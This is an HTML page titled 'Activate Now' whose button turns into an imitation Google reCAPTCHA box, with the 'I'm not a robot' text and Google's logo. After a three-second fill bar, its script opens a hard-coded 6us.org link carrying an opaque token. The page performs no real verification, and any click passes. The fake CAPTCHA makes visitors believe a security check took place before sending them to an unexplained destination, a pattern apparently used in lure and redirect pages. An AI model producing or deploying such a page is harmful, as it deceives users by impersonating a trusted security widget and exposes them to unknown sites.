<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Activate Now</title>
  <meta name="description" content="Single button that becomes a reCAPTCHA-style box, then shows a loading fill and redirects." />
  <style>
    :root{
      --text:#e5e7eb;              /* better contrast on dark hosts */
      --accent:#60a5fa;            /* blue-400 */
      --accent-hover:#93c5fd;      /* blue-300 */
      --border:#2b3544;            /* subtle on dark */
      --box:#cfd8dc;
      --check:#10b981;
      --bar:rgba(96,165,250,.35);  /* lighter fill on dark */
      --focus:rgba(96,165,250,.45);/* custom focus ring */
    }
    html,body{height:100%}
    body{
      margin:0; background:transparent; color:var(--text);
      font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;
      display:grid; place-items:center;
    }
    .wrap{ width:min(360px,96vw); }

    /* ===== Button ===== */
    #action{
      position:relative; width:100%;
      display:inline-flex; align-items:center; justify-content:center; gap:.6rem;
      padding:.95em 1.25em; border-radius:999px;
      background:transparent; color:var(--accent);
      border:2px solid currentColor;
      font-weight:800; font-size:1.05rem; line-height:1.2;
      cursor:pointer; user-select:none; overflow:hidden;
      transition: color .18s, border-color .18s, border-radius .22s, padding .22s, box-shadow .18s;
    }
    #action:hover{ color:var(--accent-hover); border-color:var(--accent-hover) }
    #action:disabled{ opacity:.9; cursor:not-allowed }

    /* ==== FOCUS STYLE FIX ==== */
    #action:focus{ outline: none; }
    /* Option A: soft glow */
    #action:focus-visible{ outline: none; box-shadow: 0 0 0 3px var(--focus); }
    /* If you want NO ring at all, comment Option A above and uncomment below */
    /* #action:focus-visible{ outline: none; box-shadow:none; } */
    /* ======================== */

    #action .label{ position:relative; z-index:2; white-space:nowrap }

    /* Progress fill */
    #action .bar{
      position:absolute; left:0; top:0; height:100%; width:0;
      background:var(--bar); z-index:1; pointer-events:none; opacity:1;
      will-change: width; transform: translateZ(0);
    }
    @keyframes fill3s{ from{width:0%} to{width:100%} }

    /* reCAPTCHA look */
    #action .recaptcha{ display:none; width:100% }
    #action.captcha{ border:0; padding:0; border-radius:12px }
    #action.captcha .recaptcha{
      display:block; background:#fff; border:1px solid var(--border); border-radius:12px;
      box-shadow:0 2px 10px rgba(0,0,0,.25);
    }
    .rc-row{ display:flex; align-items:center; justify-content:space-between; padding:12px 14px 8px 12px }
    .rc-left{ display:flex; align-items:center; gap:12px }
    .rc-text{ font-size:16px; font-weight:600; color:#111 }

    .rc-box{
      width:24px; height:24px; border:2px solid var(--box); border-radius:4px;
      background:#fff; display:grid; place-items:center; cursor:pointer; outline:none;
    }
    .rc-box .tick{
      width:14px; height:14px; border-radius:3px; background:transparent;
      transform:scale(0); transition:transform .13s ease-out, background .13s ease-out;
    }
    .rc-box.checked .tick{ background:var(--check); transform:scale(1) }

    .rc-right{ display:flex; align-items:center; gap:8px; color:#666 }
    .rc-logo{ width:32px; height:32px }
    .rc-brand{ font-size:12px }

    .rc-terms{ text-align:right; padding:0 12px 10px; color:#888; font-size:12px }
    .rc-terms a{ color:#888; text-decoration:none; margin:0 4px }
    .rc-terms a:hover{ text-decoration:underline }

    #action.idle .label{ display:block }
    #action.idle .recaptcha{ display:none }
    #action.captcha .label{ display:none }

    #action.loading{
      border-color:var(--accent); color:var(--accent);
      border-radius:999px; padding:.95em 1.25em;
    }
    #action.loading .label{ display:block }
    #action.loading .recaptcha{ display:none }
    #action.loading .bar{ animation:fill3s 3s linear forwards }

    .hint{ margin-top:.65rem; text-align:center; color:#9aa3b2; font-size:.95rem }
    .continue{ display:none; margin-top:.55rem; text-align:center }
    .continue a{ font-weight:800; color:var(--accent); text-decoration:none }
    .continue a:hover{ color:var(--accent-hover); text-decoration:underline }
  </style>
</head>
<body>
  <div class="wrap">
    <button id="action" class="idle" type="button" aria-live="polite">
      <span class="label">Activate Now</span>

      <span class="recaptcha" aria-hidden="true">
        <span class="rc-row">
          <span class="rc-left">
            <span class="rc-box" id="rcBox" role="checkbox" aria-checked="false" tabindex="0">
              <span class="tick"></span>
            </span>
            <span class="rc-text">I'm not a robot</span>
          </span>
          <span class="rc-right">
            <img class="rc-logo" src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
            <span class="rc-brand">reCAPTCHA</span>
          </span>
        </span>
        <div class="rc-terms"><a href="#">Privacy</a> · <a href="#">Terms</a></div>
      </span>

      <span class="bar" aria-hidden="true"></span>
    </button>

    <div class="hint" id="hint" aria-hidden="true"></div>
    <div class="continue" id="continue"><a id="continueLink" href="#" target="_blank" rel="noopener">Continue</a></div>
  </div>

  <script>
    const DEST_URL = "https://6us.org/?27qX8fFg3NxUDhCju3K2HCDm2h8FXsZiAbTI5VXJkyqV3oXEqhbpW";

    const btn  = document.getElementById('action');
    const hint = document.getElementById('hint');
    const rcBox = document.getElementById('rcBox');
    const bar = btn.querySelector('.bar');
    const continueWrap = document.getElementById('continue');
    const continueLink = document.getElementById('continueLink');

    let state = 'idle';

    function toCaptcha(){
      state = 'captcha';
      btn.classList.remove('idle','loading');
      btn.classList.add('captcha');
      hint.textContent = "Click the square checkbox to verify.";
      hint.removeAttribute('aria-hidden');
      rcBox.focus();
    }

    function toLoading(){
      state = 'loading';
      btn.classList.remove('idle','captcha');
      btn.classList.add('loading');
      btn.disabled = true;
      btn.querySelector('.label').textContent = 'Verifying…';
      rcBox.classList.add('checked');
      rcBox.setAttribute('aria-checked','true');
      hint.textContent = "Please wait ~3 seconds…";

      // Redirect AFTER the fill completes
      const onDone = () => {
        const w = window.open(DEST_URL, "_blank", "noopener");
        if (!w) {
          continueLink.href = DEST_URL;
          continueWrap.style.display = "block";
          hint.textContent = "Verification complete. Tap Continue to open your page.";
        }
      };
      bar.addEventListener('animationend', onDone, { once: true });
    }

    btn.addEventListener('click', () => {
      if (state === 'idle') toCaptcha();
    });

    rcBox.addEventListener('click', (e) => {
      e.stopPropagation();
      if (state === 'captcha') toLoading();
    });

    rcBox.addEventListener('keydown', (e) => {
      if (state === 'captcha' && (e.key === ' ' || e.key === 'Enter')) {
        e.preventDefault();
        toLoading();
      }
    });

    btn.addEventListener('keydown', (e) => {
      if ((e.key === ' ' || e.key === 'Enter') && state === 'captcha') {
        e.preventDefault();
      }
    });
  </script>
</body>
</html>
